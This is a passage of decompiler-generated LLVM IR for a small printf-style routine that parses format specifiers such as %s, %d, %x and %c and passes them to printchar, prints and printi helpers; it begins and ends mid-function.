  %v1_804851c = add i8 %stack_var_-36.0, 48
  store i8 %v1_804851c, i8* %v22_8048516, align 1
  %v5_804853b = sext i32 %v13_80484fc to i64
  %v5_804853e = icmp eq i32 %v13_80484fc, 0
  %v1_8048542 = icmp eq i1 %v5_804853e, false
  br i1 %v1_8048542, label %dec_label_pc_80484ee, label %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge

dec_label_pc_804853e.dec_label_pc_8048544_crit_edge: ; preds = %dec_label_pc_8048516
  store i8* %v22_8048516, i8** %stack_var_-40, align 4
  br label %dec_label_pc_8048544

dec_label_pc_8048544:                             ; preds = %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge, %dec_label_pc_80484dd
  %v3_8048581622 = phi i32 [ %v5_8048516, %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge ], [ %v15_80484e0, %dec_label_pc_80484dd ]
  %v3_8048572 = phi i8* [ %v22_8048516, %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge ], [ %tmp48, %dec_label_pc_80484dd ]
  %v4_8048544 = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_8048544, label %dec_label_pc_804857b, label %dec_label_pc_804854a

dec_label_pc_804854a:                             ; preds = %dec_label_pc_8048544
  %v4_804854a = icmp eq i32 %tmp31, 0
  br i1 %v4_804854a, label %dec_label_pc_8048572, label %dec_label_pc_8048550

dec_label_pc_8048550:                             ; preds = %dec_label_pc_804854a
  %v1_8048553 = and i32 %tmp32, 2
  %v2_8048553 = icmp eq i32 %v1_8048553, 0
  br i1 %v2_8048553, label %dec_label_pc_8048572, label %dec_label_pc_804855a

dec_label_pc_804855a:                             ; preds = %dec_label_pc_8048550
  %v3_8048562 = inttoptr i32 %arg1 to i32*
  %v4_8048562 = call i32 @printchar(i32* %v3_8048562, i32 45)
  %v4_804856d = add i32 %tmp31, -1
  br label %dec_label_pc_804857b

dec_label_pc_8048572:                             ; preds = %dec_label_pc_8048550, %dec_label_pc_804854a
  %v4_8048572 = ptrtoint i8* %v3_8048572 to i32
  %v5_8048572 = add i32 %v4_8048572, -1
  %v22_8048572 = inttoptr i32 %v5_8048572 to i8*
  store i8* %v22_8048572, i8** %stack_var_-40, align 4
  store i8 45, i8* %v22_8048572, align 1
  %.phi.trans.insert = bitcast i8** %stack_var_-40 to i32*
  %v3_80485816.pre = load i32, i32* %.phi.trans.insert, align 4
  br label %dec_label_pc_804857b

dec_label_pc_804857b:                             ; preds = %dec_label_pc_8048544, %dec_label_pc_804855a, %dec_label_pc_8048572
  %v3_80485816 = phi i32 [ %v3_8048581622, %dec_label_pc_8048544 ], [ %v3_80485816.pre, %dec_label_pc_8048572 ], [ %v3_8048581622, %dec_label_pc_804855a ]
  %stack_var_20.0 = phi i32 [ %tmp31, %dec_label_pc_8048544 ], [ %tmp31, %dec_label_pc_8048572 ], [ %v4_804856d, %dec_label_pc_804855a ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_8048544 ], [ 0, %dec_label_pc_8048572 ], [ 1, %dec_label_pc_804855a ]
  %v1_8048587.cast = inttoptr i32 %v3_80485816 to i8*
  %v6_8048587 = call i32 @prints(i32 %arg1, i8* %v1_8048587.cast, i32 %stack_var_20.0, i32 %tmp32)
  %v2_8048592 = add i32 %v6_8048587, %stack_var_-28.0
  store i32 %v2_8048592, i32* @edx, align 4
  br label %dec_label_pc_8048597

dec_label_pc_8048597:                             ; preds = %dec_label_pc_8048497, %dec_label_pc_804857b
  %storemerge = phi i32 [ %v2_8048592, %dec_label_pc_804857b ], [ %v6_80484ac, %dec_label_pc_8048497 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %v22_8048516, { 0, 1, 3, 2 }
  uselistorder i8 %v5_8048501, { 1, 0 }
  uselistorder i64 %v6_80484fc, { 1, 0 }
  uselistorder i32 %tmp35, { 3, 1, 2, 0 }
  uselistorder i32 %tmp32, { 0, 2, 1 }
  uselistorder i32 %tmp31, { 2, 4, 1, 3, 0 }
  uselistorder i32 %tmp27, { 1, 0 }
  uselistorder i8** %stack_var_-40, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048597, { 1, 0 }
  uselistorder label %dec_label_pc_804857b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048516, { 1, 0 }
  uselistorder label %dec_label_pc_80484ee, { 1, 0 }
  uselistorder label %dec_label_pc_80484dd, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804859c = load i32, i32* @ebp, align 4
  store i32 %v0_804859c, i32* %stack_var_-4, align 4
  %v15_804859f = ptrtoint i32* %stack_var_-44 to i32
  %v2_8048791 = ptrtoint i32* %stack_var_-6 to i32
  %stack_var_8.444 = inttoptr i32 %arg2 to i8*
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_80487c745 = load i8, i8* %stack_var_8.444, align 1
  %v3_80487c746 = zext i8 %v2_80487c745 to i32
  %v5_80487c747 = and i32 %arg2, -256
  %v6_80487c748 = or i32 %v3_80487c746, %v5_80487c747
  store i32 %v6_80487c748, i32* %eax.global-to-local, align 4
  %v4_80487c949 = icmp eq i8 %v2_80487c745, 0
  %v1_80487cb50 = icmp eq i1 %v4_80487c949, false
  br i1 %v1_80487cb50, label %dec_label_pc_80485ae, label %dec_label_pc_80487d1

dec_label_pc_80485ae:                             ; preds = %entry, %dec_label_pc_80487c1
  %v0_80487af = phi i32 [ %v4_804867366, %dec_label_pc_80487c1 ], [ %v15_804859f, %entry ]
  %v5_80487c756 = phi i32 [ %v5_80487c7, %dec_label_pc_80487c1 ], [ %v5_80487c747, %entry ]
  %stack_var_8.455 = phi i8* [ %stack_var_8.4, %dec_label_pc_80487c1 ], [ %stack_var_8.444, %entry ]
  %stack_var_-28.154 = phi i32 [ %stack_var_-28.0, %dec_label_pc_80487c1 ], [ 0, %entry ]
  %stack_var_8.4.in53 = phi i32 [ %v5_80487c1, %dec_label_pc_80487c1 ], [ %arg2, %entry ]
  %stack_var_12.152 = phi i32 [ %stack_var_12.0, %dec_label_pc_80487c1 ], [ %arg3, %entry ]
  %stack_var_-24.151 = phi i32 [ %stack_var_-24.0, %dec_label_pc_80487c1 ], [ %tmp5, %entry ]
  store i32 %stack_var_8.4.in53, i32* %eax.global-to-local, align 4
  %v2_80485b1 = load i8, i8* %stack_var_8.455, align 1
  %v3_80485b1 = zext i8 %v2_80485b1 to i32
  %v6_80485b1 = or i32 %v3_80485b1, %v5_80487c756
  store i32 %v6_80485b1, i32* %eax.global-to-local, align 4
  %v10_80485b3 = icmp eq i8 %v2_80485b1, 37
  %v1_80485b5 = icmp eq i1 %v10_80485b3, false
  br i1 %v1_80485b5, label %dec_label_pc_80487a5, label %dec_label_pc_80485bb

dec_label_pc_80485bb:                             ; preds = %dec_label_pc_80485ae
  %v5_80485bb = add i32 %stack_var_8.4.in53, 1
  %v22_80485bb = inttoptr i32 %v5_80485bb to i8*
  store i32 %v5_80485bb, i32* %eax.global-to-local, align 4
  %v2_80485ce = load i8, i8* %v22_80485bb, align 1
  %v3_80485ce = zext i8 %v2_80485ce to i32
  %v5_80485ce = and i32 %v5_80485bb, -256
  %v6_80485ce = or i32 %v3_80485ce, %v5_80485ce
  store i32 %v6_80485ce, i32* %eax.global-to-local, align 4
  %v4_80485d0 = icmp eq i8 %v2_80485ce, 0
  br i1 %v4_80485d0, label %dec_label_pc_80487d1, label %dec_label_pc_80485d8

dec_label_pc_80485d8:                             ; preds = %dec_label_pc_80485bb
  store i32 %v5_80485bb, i32* %eax.global-to-local, align 4
  %v2_80485db = load i8, i8* %v22_80485bb, align 1
  %v3_80485db = zext i8 %v2_80485db to i32
  %v6_80485db = or i32 %v3_80485db, %v5_80485ce
  store i32 %v6_80485db, i32* %eax.global-to-local, align 4
  %v10_80485dd = icmp eq i8 %v2_80485db, 37
  br i1 %v10_80485dd, label %dec_label_pc_80487a5, label %dec_label_pc_80485e5

dec_label_pc_80485e5:                             ; preds = %dec_label_pc_80485d8
  store i32 %v5_80485bb, i32* %eax.global-to-local, align 4
  %v2_80485e8 = load i8, i8* %v22_80485bb, align 1
  %v3_80485e8 = zext i8 %v2_80485e8 to i32
  %v6_80485e8 = or i32 %v3_80485e8, %v5_80485ce
  store i32 %v6_80485e8, i32* %eax.global-to-local, align 4
  %v10_80485ea = icmp eq i8 %v2_80485e8, 45
  %v1_80485ec = icmp eq i1 %v10_80485ea, false
  br i1 %v1_80485ec, label %dec_label_pc_8048601.preheader, label %dec_label_pc_80485ee

dec_label_pc_80485ee:                             ; preds = %dec_label_pc_80485e5
  %v5_80485ee = add i32 %stack_var_8.4.in53, 2
  %v22_80485ee = inttoptr i32 %v5_80485ee to i8*
  br label %dec_label_pc_8048601.preheader

dec_label_pc_8048601.preheader:                   ; preds = %dec_label_pc_80485ee, %dec_label_pc_80485e5
  %stack_var_8.0.ph = phi i8* [ %v22_80485bb, %dec_label_pc_80485e5 ], [ %v22_80485ee, %dec_label_pc_80485ee ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_80485e5 ], [ 1, %dec_label_pc_80485ee ]
  %v4_804860115 = ptrtoint i8* %stack_var_8.0.ph to i32
  store i32 %v4_804860115, i32* %eax.global-to-local, align 4
  %v2_804860416 = load i8, i8* %stack_var_8.0.ph, align 1
  %v3_804860417 = zext i8 %v2_804860416 to i32
  %v5_804860418 = and i32 %v4_804860115, -256
  %v6_804860419 = or i32 %v3_804860417, %v5_804860418
  store i32 %v6_804860419, i32* %eax.global-to-local, align 4
  %v7_804860621 = icmp eq i8 %v2_804860416, 48
  br i1 %v7_804860621, label %dec_label_pc_80485fa, label %dec_label_pc_8048630.preheader

dec_label_pc_80485fa:                             ; preds = %dec_label_pc_8048601.preheader, %dec_label_pc_80485fa
  %v4_804860123 = phi i32 [ %v5_80485fa, %dec_label_pc_80485fa ], [ %v4_804860115, %dec_label_pc_8048601.preheader ]
  %stack_var_-32.022 = phi i32 [ %v4_80485fd, %dec_label_pc_80485fa ], [ %stack_var_-32.0.ph, %dec_label_pc_8048601.preheader ]
  %v5_80485fa = add i32 %v4_804860123, 1
  %v22_80485fa = inttoptr i32 %v5_80485fa to i8*
  %v4_80485fd = or i32 %stack_var_-32.022, 2
  store i32 %v5_80485fa, i32* %eax.global-to-local, align 4
  %v2_8048604 = load i8, i8* %v22_80485fa, align 1
  %v3_8048604 = zext i8 %v2_8048604 to i32
  %v5_8048604 = and i32 %v5_80485fa, -256
  %v6_8048604 = or i32 %v3_8048604, %v5_8048604
  store i32 %v6_8048604, i32* %eax.global-to-local, align 4
  %v7_8048606 = icmp eq i8 %v2_8048604, 48
  br i1 %v7_8048606, label %dec_label_pc_80485fa, label %dec_label_pc_8048630.preheader

dec_label_pc_8048630.preheader:                   ; preds = %dec_label_pc_80485fa, %dec_label_pc_8048601.preheader
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_8048601.preheader ], [ %v4_80485fd, %dec_label_pc_80485fa ]
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_8048601.preheader ], [ %v22_80485fa, %dec_label_pc_80485fa ]
  %v4_804863025 = ptrtoint i8* %stack_var_8.0.lcssa to i32
  store i32 %v4_804863025, i32* %eax.global-to-local, align 4
  %v2_804863326 = load i8, i8* %stack_var_8.0.lcssa, align 1
  %v3_804863327 = zext i8 %v2_804863326 to i32
  %v5_804863328 = and i32 %v4_804863025, -256
  %v6_804863329 = or i32 %v3_804863327, %v5_804863328
  store i32 %v6_804863329, i32* %eax.global-to-local, align 4
  %tmp67 = icmp ult i8 %v2_804863326, 48
  br i1 %tmp67, label %dec_label_pc_8048642, label %dec_label_pc_8048639

dec_label_pc_804860c:                             ; preds = %dec_label_pc_8048639
  %v2_8048615 = mul i32 %stack_var_-36.032, 10
  store i32 %v4_804863034, i32* %eax.global-to-local, align 4
  %v2_804861d = load i8, i8* %stack_var_8.133, align 1
  %v3_804861d = zext i8 %v2_804861d to i32
  %v5_8048624 = add i32 %v3_804861d, %v2_8048615
  %v1_8048627 = add i32 %v5_8048624, -48
  %v5_804862d = add i32 %v4_804863034, 1
  %v22_804862d = inttoptr i32 %v5_804862d to i8*
  store i32 %v5_804862d, i32* %eax.global-to-local, align 4
  %v2_8048633 = load i8, i8* %v22_804862d, align 1
  %v3_8048633 = zext i8 %v2_8048633 to i32
  %v5_8048633 = and i32 %v5_804862d, -256
  %v6_8048633 = or i32 %v3_8048633, %v5_8048633
  store i32 %v6_8048633, i32* %eax.global-to-local, align 4
  %tmp68 = icmp ult i8 %v2_8048633, 48
  br i1 %tmp68, label %dec_label_pc_8048642, label %dec_label_pc_8048639

dec_label_pc_8048639:                             ; preds = %dec_label_pc_8048630.preheader, %dec_label_pc_804860c
  %v5_804863335 = phi i32 [ %v5_8048633, %dec_label_pc_804860c ], [ %v5_804863328, %dec_label_pc_8048630.preheader ]
  %v4_804863034 = phi i32 [ %v5_804862d, %dec_label_pc_804860c ], [ %v4_804863025, %dec_label_pc_8048630.preheader ]
  %stack_var_8.133 = phi i8* [ %v22_804862d, %dec_label_pc_804860c ], [ %stack_var_8.0.lcssa, %dec_label_pc_8048630.preheader ]
  %stack_var_-36.032 = phi i32 [ %v1_8048627, %dec_label_pc_804860c ], [ 0, %dec_label_pc_8048630.preheader ]
  store i32 %v4_804863034, i32* %eax.global-to-local, align 4
  %v2_804863c = load i8, i8* %stack_var_8.133, align 1
  %v3_804863c = zext i8 %v2_804863c to i32
  %v6_804863c = or i32 %v3_804863c, %v5_804863335
  store i32 %v6_804863c, i32* %eax.global-to-local, align 4
  %tmp69 = icmp ult i8 %v2_804863c, 58
  br i1 %tmp69, label %dec_label_pc_804860c, label %dec_label_pc_8048642

dec_label_pc_8048642:                             ; preds = %dec_label_pc_804860c, %dec_label_pc_8048639, %dec_label_pc_8048630.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_8048630.preheader ], [ %stack_var_-36.032, %dec_label_pc_8048639 ], [ %v1_8048627, %dec_label_pc_804860c ]
  %stack_var_8.1.lcssa = phi i8* [ %stack_var_8.0.lcssa, %dec_label_pc_8048630.preheader ], [ %stack_var_8.133, %dec_label_pc_8048639 ], [ %v22_804862d, %dec_label_pc_804860c ]
  %v4_8048630.lcssa = phi i32 [ %v4_804863025, %dec_label_pc_8048630.preheader ], [ %v4_804863034, %dec_label_pc_8048639 ], [ %v5_804862d, %dec_label_pc_804860c ]
  %v5_8048633.lcssa = phi i32 [ %v5_804863328, %dec_label_pc_8048630.preheader ], [ %v5_804863335, %dec_label_pc_8048639 ], [ %v5_8048633, %dec_label_pc_804860c ]
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048645 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048645 = zext i8 %v2_8048645 to i32
  %v6_8048645 = or i32 %v3_8048645, %v5_8048633.lcssa
  store i32 %v6_8048645, i32* %eax.global-to-local, align 4
  %v10_8048647 = icmp eq i8 %v2_8048645, 115
  %v1_8048649 = icmp eq i1 %v10_8048647, false
  br i1 %v1_8048649, label %dec_label_pc_804868d, label %dec_label_pc_804864b

dec_label_pc_804864b:                             ; preds = %dec_label_pc_8048642
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_804864e = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048656 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048656 = load i32, i32* %v1_8048656, align 4
  store i32 %v2_8048656, i32* %eax.global-to-local, align 4
  %v4_804865b = icmp eq i32 %v2_8048656, 0
  br i1 %v4_804865b, label %dec_label_pc_8048670, label %dec_label_pc_8048661

dec_label_pc_8048661:                             ; preds = %dec_label_pc_804864b
  store i32 %v2_8048656, i32* %eax.global-to-local, align 4
  %v5_8048664 = inttoptr i32 %v2_8048656 to i8*
  br label %dec_label_pc_8048670

dec_label_pc_8048670:                             ; preds = %dec_label_pc_804864b, %dec_label_pc_8048661
  %storemerge = phi i8* [ %v5_8048664, %dec_label_pc_8048661 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8055d7d.12, i32 0, i32 0), %dec_label_pc_804864b ]
  %v4_8048670 = ptrtoint i8* %storemerge to i32
  store i32 %v4_8048670, i32* %eax.global-to-local, align 4
  %v5_8048673 = add i32 %v0_80487af, -4
  %v6_8048673 = inttoptr i32 %v5_8048673 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048673, align 4
  %v5_8048676 = add i32 %v0_80487af, -8
  %v6_8048676 = inttoptr i32 %v5_8048676 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048676, align 4
  %v0_8048679 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048679 = add i32 %v0_80487af, -12
  %v3_8048679 = inttoptr i32 %v2_8048679 to i32*
  store i32 %v0_8048679, i32* %v3_8048679, align 4
  %v5_804867a = add i32 %v0_80487af, -16
  %v6_804867a = inttoptr i32 %v5_804867a to i32*
  store i32 %tmp3, i32* %v6_804867a, align 4
  %v5_804867d = inttoptr i32 %stack_var_-36.0.lcssa to i8*
  %v6_804867d = call i32 @prints(i32 %v4_8048670, i8* %v5_804867d, i32 %stack_var_-32.0.lcssa, i32 %stack_var_-28.154)
  store i32 %v6_804867d, i32* %eax.global-to-local, align 4
  %v0_8048682 = load i32, i32* @esp, align 4
  %v1_8048682 = add i32 %v0_8048682, 16
  %v5_8048685 = add i32 %v6_804867d, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_804868d:                             ; preds = %dec_label_pc_8048642
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048690 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048690 = zext i8 %v2_8048690 to i32
  %v6_8048690 = or i32 %v3_8048690, %v5_8048633.lcssa
  store i32 %v6_8048690, i32* %eax.global-to-local, align 4
  %v10_8048692 = icmp eq i8 %v2_8048690, 100
  %v1_8048694 = icmp eq i1 %v10_8048692, false
  br i1 %v1_8048694, label %dec_label_pc_80486c6, label %dec_label_pc_8048696

dec_label_pc_8048696:                             ; preds = %dec_label_pc_804868d
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_8048699 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_80486a1 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_80486a1 = load i32, i32* %v1_80486a1, align 4
  store i32 %v2_80486a1, i32* %eax.global-to-local, align 4
  %v1_80486a6 = add i32 %v0_80487af, -8
  %v2_80486a6 = inttoptr i32 %v1_80486a6 to i32*
  store i32 97, i32* %v2_80486a6, align 4
  %v5_80486a8 = add i32 %v0_80487af, -12
  %v6_80486a8 = inttoptr i32 %v5_80486a8 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80486a8, align 4
  %v5_80486ab = add i32 %v0_80487af, -16
  %v6_80486ab = inttoptr i32 %v5_80486ab to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80486ab, align 4
  %v1_80486ae = add i32 %v0_80487af, -20
  %v2_80486ae = inttoptr i32 %v1_80486ae to i32*
  store i32 1, i32* %v2_80486ae, align 4
  %v1_80486b0 = add i32 %v0_80487af, -24
  %v2_80486b0 = inttoptr i32 %v1_80486b0 to i32*
  store i32 10, i32* %v2_80486b0, align 4
  %v0_80486b2 = load i32, i32* %eax.global-to-local, align 4
  %v2_80486b2 = add i32 %v0_80487af, -28
  %v3_80486b2 = inttoptr i32 %v2_80486b2 to i32*
  store i32 %v0_80486b2, i32* %v3_80486b2, align 4
  %v5_80486b3 = add i32 %v0_80487af, -32
  %v6_80486b3 = inttoptr i32 %v5_80486b3 to i32*
  store i32 %tmp3, i32* %v6_80486b3, align 4
  %v1_80486b6 = call i32 @printi(i32 %v1_8048699)
  store i32 %v1_80486b6, i32* %eax.global-to-local, align 4
  %v0_80486bb = load i32, i32* @esp, align 4
  %v1_80486bb = add i32 %v0_80486bb, 32
  %v5_80486be = add i32 %v1_80486b6, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_80486c6:                             ; preds = %dec_label_pc_804868d
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_80486c9 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_80486c9 = zext i8 %v2_80486c9 to i32
  %v6_80486c9 = or i32 %v3_80486c9, %v5_8048633.lcssa
  store i32 %v6_80486c9, i32* %eax.global-to-local, align 4
  %v10_80486cb = icmp eq i8 %v2_80486c9, 120
  %v1_80486cd = icmp eq i1 %v10_80486cb, false
  br i1 %v1_80486cd, label %dec_label_pc_80486ff, label %dec_label_pc_80486cf

dec_label_pc_80486cf:                             ; preds = %dec_label_pc_80486c6
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_80486d2 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_80486da = inttoptr i32 %stack_var_12.152 to i32*
  %v2_80486da = load i32, i32* %v1_80486da, align 4
  store i32 %v2_80486da, i32* %eax.global-to-local, align 4
  %v1_80486df = add i32 %v0_80487af, -8
  %v2_80486df = inttoptr i32 %v1_80486df to i32*
  store i32 97, i32* %v2_80486df, align 4
  %v5_80486e1 = add i32 %v0_80487af, -12
  %v6_80486e1 = inttoptr i32 %v5_80486e1 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80486e1, align 4
  %v5_80486e4 = add i32 %v0_80487af, -16
  %v6_80486e4 = inttoptr i32 %v5_80486e4 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80486e4, align 4
  %v1_80486e7 = add i32 %v0_80487af, -20
  %v2_80486e7 = inttoptr i32 %v1_80486e7 to i32*
  store i32 0, i32* %v2_80486e7, align 4
  %v1_80486e9 = add i32 %v0_80487af, -24
  %v2_80486e9 = inttoptr i32 %v1_80486e9 to i32*
  store i32 16, i32* %v2_80486e9, align 4
  %v0_80486eb = load i32, i32* %eax.global-to-local, align 4
  %v2_80486eb = add i32 %v0_80487af, -28
  %v3_80486eb = inttoptr i32 %v2_80486eb to i32*
  store i32 %v0_80486eb, i32* %v3_80486eb, align 4
  %v5_80486ec = add i32 %v0_80487af, -32
  %v6_80486ec = inttoptr i32 %v5_80486ec to i32*
  store i32 %tmp3, i32* %v6_80486ec, align 4
  %v1_80486ef = call i32 @printi(i32 %v1_80486d2)
  store i32 %v1_80486ef, i32* %eax.global-to-local, align 4
  %v0_80486f4 = load i32, i32* @esp, align 4
  %v1_80486f4 = add i32 %v0_80486f4, 32
  %v5_80486f7 = add i32 %v1_80486ef, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_80486ff:                             ; preds = %dec_label_pc_80486c6
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048702 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048702 = zext i8 %v2_8048702 to i32
  %v6_8048702 = or i32 %v3_8048702, %v5_8048633.lcssa
  store i32 %v6_8048702, i32* %eax.global-to-local, align 4
  %v10_8048704 = icmp eq i8 %v2_8048702, 88
  %v1_8048706 = icmp eq i1 %v10_8048704, false
  br i1 %v1_8048706, label %dec_label_pc_8048738, label %dec_label_pc_8048708

dec_label_pc_8048708:                             ; preds = %dec_label_pc_80486ff
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_804870b = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048713 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048713 = load i32, i32* %v1_8048713, align 4
  store i32 %v2_8048713, i32* %eax.global-to-local, align 4
  %v1_8048718 = add i32 %v0_80487af, -8
  %v2_8048718 = inttoptr i32 %v1_8048718 to i32*
  store i32 65, i32* %v2_8048718, align 4
  %v5_804871a = add i32 %v0_80487af, -12
  %v6_804871a = inttoptr i32 %v5_804871a to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804871a, align 4
  %v5_804871d = add i32 %v0_80487af, -16
  %v6_804871d = inttoptr i32 %v5_804871d to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804871d, align 4
  %v1_8048720 = add i32 %v0_80487af, -20
  %v2_8048720 = inttoptr i32 %v1_8048720 to i32*
  store i32 0, i32* %v2_8048720, align 4
  %v1_8048722 = add i32 %v0_80487af, -24
  %v2_8048722 = inttoptr i32 %v1_8048722 to i32*
  store i32 16, i32* %v2_8048722, align 4
  %v0_8048724 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048724 = add i32 %v0_80487af, -28
  %v3_8048724 = inttoptr i32 %v2_8048724 to i32*
  store i32 %v0_8048724, i32* %v3_8048724, align 4
  %v5_8048725 = add i32 %v0_80487af, -32
  %v6_8048725 = inttoptr i32 %v5_8048725 to i32*
  store i32 %tmp3, i32* %v6_8048725, align 4
  %v1_8048728 = call i32 @printi(i32 %v1_804870b)
  store i32 %v1_8048728, i32* %eax.global-to-local, align 4
  %v0_804872d = load i32, i32* @esp, align 4
  %v1_804872d = add i32 %v0_804872d, 32
  %v5_8048730 = add i32 %v1_8048728, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_8048738:                             ; preds = %dec_label_pc_80486ff
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_804873b = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_804873b = zext i8 %v2_804873b to i32
  %v6_804873b = or i32 %v3_804873b, %v5_8048633.lcssa
  store i32 %v6_804873b, i32* %eax.global-to-local, align 4
  %v10_804873d = icmp eq i8 %v2_804873b, 117
  %v1_804873f = icmp eq i1 %v10_804873d, false
  br i1 %v1_804873f, label %dec_label_pc_804876e, label %dec_label_pc_8048741

dec_label_pc_8048741:                             ; preds = %dec_label_pc_8048738
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_8048744 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_804874c = inttoptr i32 %stack_var_12.152 to i32*
  %v2_804874c = load i32, i32* %v1_804874c, align 4
  store i32 %v2_804874c, i32* %eax.global-to-local, align 4
  %v1_8048751 = add i32 %v0_80487af, -8
  %v2_8048751 = inttoptr i32 %v1_8048751 to i32*
  store i32 97, i32* %v2_8048751, align 4
  %v5_8048753 = add i32 %v0_80487af, -12
  %v6_8048753 = inttoptr i32 %v5_8048753 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048753, align 4
  %v5_8048756 = add i32 %v0_80487af, -16
  %v6_8048756 = inttoptr i32 %v5_8048756 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048756, align 4
  %v1_8048759 = add i32 %v0_80487af, -20
  %v2_8048759 = inttoptr i32 %v1_8048759 to i32*
  store i32 0, i32* %v2_8048759, align 4
  %v1_804875b = add i32 %v0_80487af, -24
  %v2_804875b = inttoptr i32 %v1_804875b to i32*
  store i32 10, i32* %v2_804875b, align 4
  %v0_804875d = load i32, i32* %eax.global-to-local, align 4
  %v2_804875d = add i32 %v0_80487af, -28
  %v3_804875d = inttoptr i32 %v2_804875d to i32*
  store i32 %v0_804875d, i32* %v3_804875d, align 4
  %v5_804875e = add i32 %v0_80487af, -32
  %v6_804875e = inttoptr i32 %v5_804875e to i32*
  store i32 %tmp3, i32* %v6_804875e, align 4
  %v1_8048761 = call i32 @printi(i32 %v1_8048744)
  store i32 %v1_8048761, i32* %eax.global-to-local, align 4
  %v0_8048766 = load i32, i32* @esp, align 4
  %v1_8048766 = add i32 %v0_8048766, 32
  %v5_8048769 = add i32 %v1_8048761, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_804876e:                             ; preds = %dec_label_pc_8048738
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048771 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048771 = zext i8 %v2_8048771 to i32
  %v6_8048771 = or i32 %v3_8048771, %v5_8048633.lcssa
  store i32 %v6_8048771, i32* %eax.global-to-local, align 4
  %v10_8048773 = icmp eq i8 %v2_8048771, 99
  %v1_8048775 = icmp eq i1 %v10_8048773, false
  br i1 %v1_8048775, label %dec_label_pc_80487c1, label %dec_label_pc_8048777

dec_label_pc_8048777:                             ; preds = %dec_label_pc_804876e
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_804877a = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048782 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048782 = load i32, i32* %v1_8048782, align 4
  store i32 %v2_8048782, i32* %stack_var_-6, align 4
  %v5_804878b = add i32 %v0_80487af, -4
  %v6_804878b = inttoptr i32 %v5_804878b to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804878b, align 4
  %v5_804878e = add i32 %v0_80487af, -8
  %v6_804878e = inttoptr i32 %v5_804878e to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804878e, align 4
  store i32 %v2_8048791, i32* %eax.global-to-local, align 4
  %v2_8048794 = add i32 %v0_80487af, -12
  %v3_8048794 = inttoptr i32 %v2_8048794 to i32*
